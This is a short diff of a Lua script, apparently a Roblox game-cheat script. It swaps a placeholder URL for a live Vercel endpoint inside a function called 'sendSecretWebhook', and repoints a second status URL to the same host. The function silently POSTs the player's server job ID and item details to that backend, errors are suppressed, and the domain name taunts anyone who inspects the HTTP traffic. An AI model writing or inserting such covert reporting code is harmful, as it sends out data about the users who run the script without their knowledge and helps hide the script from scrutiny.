@@ -203,7 +203,7 @@ local function sendSecretWebhook(nome, gen, jobId, raridade)
 
         pcall(function()
             requestFunc({
-                Url = "https://example.com",
+                Url = "https://para-de-dar-http-spy-skidder-safado.vercel.app/job",
                 Method="POST",
                 Headers={["Content-Type"]="application/json"},
                 Body=HttpService:JSONEncode(body)
@@ -296,7 +296,7 @@ local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
 --// URL do backend
-local url = "https://apifoda-ei7u.vercel.app/status"
+local url = "https://para-de-dar-http-spy-skidder-safado.vercel.app/status"
 
 --// Dados a enviar
 local data = {
